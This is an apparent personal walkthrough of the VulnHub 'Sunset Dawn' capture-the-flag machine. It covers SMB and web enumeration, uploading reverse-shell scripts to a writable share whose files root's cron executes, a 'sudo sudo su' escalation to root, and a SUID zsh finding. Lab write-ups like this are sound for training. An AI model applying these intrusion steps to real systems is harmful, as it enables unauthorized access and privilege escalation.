
---

https://www.vulnhub.com/entry/sunset-dawn,341/

\[OS]: Debian
\[Web-Technology]: Apache httpd 2.4.38 
\[Hostname]:  Dawn
\[IP]:  192.168.56.120 
\[USERS]:   dawn, ganimede
\[CREDENTIALS]:  

---
\[To-Try LIST]:  

**HTTP 80** Apache httpd 2.4.38

**Samba:** 

Message signing not required, guest login supported
**139** Samba smbd 3.X - 4.X
**445** Samba smbd 4.9.5-Debian

smbenum shares: 
IPC$ - anonymous read/write -  null session enum 4.9.5
ITDEPT - anonymous read/write - local path home/dawn/ITDEPT/ - user is dawn
print$ - no access

```bash
nmap -p 139,445 --script smb-enum-shares $IP

smbclient //192.168.56.120/ITDEPT -N #Empty but writable

# IPC is an administrative share for RPC etc. that doesn't contain browseable files but has READ/WRITE access for RPC enum

rpcclient -U "" -N $IP  
lookupnames dawn
-> dawn S-1-5-21-4292367078-475864837-953252120 (Domain: 3)

enum4linux -a $IP

-> no password lockout and weak complexity

-> local users: dawn and ganimedes
```



**3306 MySQL** -> MariaDB 5.5.5-10.3.15

---
\[NMAP RESULTS]:  

PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3306/tcp open  mysql       MariaDB 5.5.5-10.3.15
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.15-MariaDB-1
|   Thread ID: 13
|   Capabilities flags: 63486
|   Some Capabilities: Speaks41ProtocolNew, Speaks41ProtocolOld, SupportsTransactions, SupportsLoadDataLocal, SupportsCompression, IgnoreSigpipes, LongColumnFlag, DontAllowDatabaseTableColumn, ODBCClient, ConnectWithDatabase, Support41Auth, IgnoreSpaceBeforeParenthesis, FoundRows, InteractiveClient, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: +S?#.\egW]NMw21?)M*)
|_  Auth Plugin Name: mysql_native_password
MAC Address: 08:00:27:3F:D5:67 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
Network Distance: 1 hop
Service Info: Host: DAWN

Host script results:
|_clock-skew: mean: 1h40m47s, deviation: 2h53m12s, median: 47s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: dawn
|   NetBIOS computer name: DAWN\x00
|   Domain name: dawn
|   FQDN: dawn.dawn
|_  System time: 2025-11-02T01:55:29-05:00
|_nbstat: NetBIOS name: DAWN, NetBIOS user: \<unknown>, NetBIOS MAC: \<unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-11-02T06:55:29
|_  start_date: N/A




--- 

\[Web Services Enumeration]:   

**Exploration** -> Under Construction - custom splash
**Page Source** -> Nothing

```bash
nikto

/logs/

# dirbusting
gobuster dir -u $URL -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 30

/logs                 (Status: 301) [Size: 315] [--> http://192.168.56.120/logs/]
/cctv                 (Status: 301) [Size: 315] [--> http://192.168.56.120/cctv/]
/server-status        (Status: 403) [Size: 302]

cctv/ - forbidden 
server-status - forbidden

/logs:
-> auth.log - 403
-> daemon.log - 403
-> error.log - 403
-> management.log - 200


management.log -> pspy monitoring everything running on system

Approximately every minute - this happens:

# Root (UID 0) makes web-control and product-control world-writable
/bin/sh -c chmod 777 /home/dawn/ITDEPT/web-control 
/bin/sh -c chmod 777 /home/dawn/ITDEPT/product-control

# CRON runs scripts phobos, web-control and product-control - /usr/sbin/CRON -f
/bin/sh -c /home/ganimedes/phobos #as root - no access to phobos yet
/bin/sh -c /home/dawn/ITDEPT/web-control # as www-data
/bin/sh -c /home/dawn/ITDEPT/product-control #as dawn

# Because we have smb write to /home/dawn/ITDEPT/ we can write a revshell to gain shell as www-data or dawn

#write  revshells named web-control and product-control

smbclient //192.168.56.120/ITDEPT -N 
put web-control web-control  # connects to listener 1 - port 4444
put product-control product-control #connects to listener 2 - port 5555





```
---


\[OTHER / PRIVILEGE-ESCALATION]:   

```bash

# Successfully got www-data revshell - S1 get tty then continue
sudo -l #(root) NOPASSWD: /usr/bin/sudo
# Okay surely not the intended route for this box
www-data@dawn:~$ sudo sudo su

root@dawn:/var/www# cat /root/flag.txt 
Hello! whitecr0wz here. I would like to congratulate and thank you for finishing the ctf, however, there is another way of getting a shell(very similar though). Also, 4 other methods are available for rooting this box!

flag{3a3e52f0a6af0d6e36d7c1ced3a9fd59}

# Way too easy lets try as dawn
# Successfully got dawn revshell - S1 get tty

#SUID is zsh so I guess it is that easy
find / -perm -4000 -type f 2>/dev/null
/usr/bin/zsh

```

--- 
Take Away Concepts: 



HOTKEYS! 
Background: Black 
Foreground (important elements): Red 
Background-Color: Select Text > Shift + Alt + B + ENTER 
Foreground Color: Select Text > Shift + Alt + F + ENTER 
Move quickly with: Function key + left and right arrows 
Cntrl + left and right arrows 
Cntrl + Shift (select text) (edited)
